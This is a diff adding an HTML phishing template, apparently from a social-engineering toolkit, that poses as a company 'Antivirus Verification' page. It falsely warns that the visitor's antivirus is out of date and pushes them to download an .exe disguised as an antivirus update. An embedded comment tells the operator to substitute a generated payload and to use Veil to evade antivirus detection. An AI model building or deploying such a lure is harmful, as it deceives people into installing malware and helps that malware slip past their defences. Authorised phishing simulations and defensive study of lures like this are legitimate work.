@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <title>{{ client.company_name }} Antivirus Verification</title>
+  <link href="./include/style-scan-new.css" media="screen" rel="stylesheet" type="text/css">
+  <link rel="SHORTCUT ICON" href="./images/favicon.ico">
+</head>
+<body class="index">
+  <div id="container">
+    <header>
+      <h1>
+        <img src="./images/logo.png" height="75">
+      </h1>
+    </header>
+    <div id="stage">
+      <section class="compatibility">
+        <article>
+          <h3>Your Antivirus is Out of Date</h3>
+          <br>
+          <p>Your antivirus is currently out of date. To download and install the new antivirus software please click the green "Continue" button below.</p>
+        </article>
+        <div class="download">
+          <ol class="links">
+            <li class="link">
+<!-- Change the link to the payload you've generated. Make sure you use Veil or something similar to bypass antivirus-->
+                <a class="btn download" href="./PartnerPlus_Antivirus_v1.5.1.exe">
+                <span>Continue</span>
+              </a>
+            </li>
+          </ol>
+        </div>
+      </section>
+    </div>
+    <footer style="display: none">
+      <p class="copy">Copyright &copy; {{ time.local|strftime('%Y') }} {{ client.company_name }}, All rights reserved.</p>
+    </footer>
+  </div>
+</body>
+</html>
